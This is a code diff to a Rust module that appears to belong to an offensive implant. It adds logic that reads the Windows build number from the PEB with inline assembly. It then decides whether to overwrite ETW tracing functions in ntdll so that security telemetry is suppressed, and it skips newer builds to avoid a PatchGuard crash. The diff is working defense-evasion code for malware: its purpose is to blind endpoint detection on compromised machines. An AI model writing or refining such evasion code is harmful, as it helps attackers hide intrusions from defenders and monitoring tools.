@@ -227,6 +227,96 @@ mod imp {
 
 // ── Public API ────────────────────────────────────────────────────────────────
 
+// Windows build at or above which PatchGuard is known to monitor ETW patches.
+// Windows 11 version 24H2 = build 26100.
+#[cfg(windows)]
+const PATCHGUARD_ETW_BUILD_THRESHOLD: u32 = 26100;
+
+/// Read the Windows build number from the PEB without calling any Win32 API.
+///
+/// On x86-64 Windows the PEB is at `gs:[0x60]`.  The relevant offsets are:
+///   * `+0x118` — `OSMajorVersion` (ULONG)
+///   * `+0x11C` — `OSMinorVersion` (ULONG)
+///   * `+0x120` — `OSBuildNumber`  (USHORT)
+///
+/// Returns `None` if the PEB pointer is null or the reads fail.
+#[cfg(windows)]
+unsafe fn peb_build_number() -> Option<u32> {
+    let peb: *const u8;
+    // SAFETY: reads a thread-local selector register; no memory is written.
+    #[cfg(target_arch = "x86_64")]
+    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, preserves_flags));
+
+    if peb.is_null() {
+        return None;
+    }
+    // PEB.OSBuildNumber is a USHORT at offset 0x120.
+    let build = *(peb.add(0x120) as *const u16) as u32;
+    // A build of 0 indicates the field was not populated (pre-Vista PEB layout).
+    if build == 0 { None } else { Some(build) }
+}
+
+/// Patch `EtwEventWrite`, `EtwEventWriteEx`, and `NtTraceEvent` according to
+/// `mode` and the current Windows build number.
+///
+/// | `mode`   | build < 26100        | build >= 26100                |
+/// |----------|----------------------|-------------------------------|
+/// | `safe`   | patch applied        | skipped (PatchGuard risk)     |
+/// | `always` | patch applied        | patch applied (testing only)  |
+/// | `never`  | skipped              | skipped                       |
+///
+/// On non-Windows targets this is a no-op.
+///
+/// # Safety
+///
+/// Modifies executable code in the running process.  Must only be called once,
+/// on Windows x86-64, before ETW-instrumented code executes.
+#[cfg(windows)]
+pub unsafe fn patch_etw_with_mode(mode: common::config::EtwPatchMode) {
+    use common::config::EtwPatchMode;
+
+    match mode {
+        EtwPatchMode::Never => {
+            log::debug!("etw_patch: mode=never; ETW patch skipped");
+            return;
+        }
+        EtwPatchMode::Safe => {
+            // SAFETY: PEB read only; no memory modification here.
+            if let Some(build) = peb_build_number() {
+                if build >= PATCHGUARD_ETW_BUILD_THRESHOLD {
+                    log::warn!(
+                        "etw_patch: Windows build {} >= {} (Win 11 24H2+); \
+                         ETW direct-patch skipped in safe mode to avoid PatchGuard BSOD. \
+                         Set malleable_profile.etw_patch_mode = 'always' to force patching \
+                         in test environments where PatchGuard is disabled.",
+                        build,
+                        PATCHGUARD_ETW_BUILD_THRESHOLD,
+                    );
+                    return;
+                }
+                log::debug!("etw_patch: Windows build {} < {}; applying ETW patch", build, PATCHGUARD_ETW_BUILD_THRESHOLD);
+            } else {
+                // Could not read the PEB build number — proceed conservatively
+                // (apply the patch; this mirrors pre-check behaviour).
+                log::debug!("etw_patch: could not read PEB OSBuildNumber; applying ETW patch");
+            }
+        }
+        EtwPatchMode::Always => {
+            log::debug!("etw_patch: mode=always; applying ETW patch regardless of build number");
+        }
+    }
+
+    let patched = imp::patch_etw();
+    if patched {
+        log::debug!("etw_patch: ETW functions patched successfully");
+    } else {
+        log::warn!("etw_patch: patch_etw returned false; no functions were patched");
+    }
+}
+
+#[cfg(not(windows))]
+pub unsafe fn patch_etw_with_mode(_mode: common::config::EtwPatchMode) {}
+
 /// Patch `EtwEventWrite`, `EtwEventWriteEx`, and `NtTraceEvent` in ntdll.dll
 /// by overwriting their first byte with `ret` (0xC3), suppressing ETW telemetry.
 ///
@@ -241,7 +331,8 @@ mod imp {
 /// on Windows x86-64, before ETW-instrumented code executes.
 #[cfg(windows)]
 pub unsafe fn patch_etw() {
-    let _ = imp::patch_etw();
+    // Default to `safe` mode when called without an explicit mode.
+    patch_etw_with_mode(common::config::EtwPatchMode::Safe);
 }
 
 #[cfg(not(windows))]
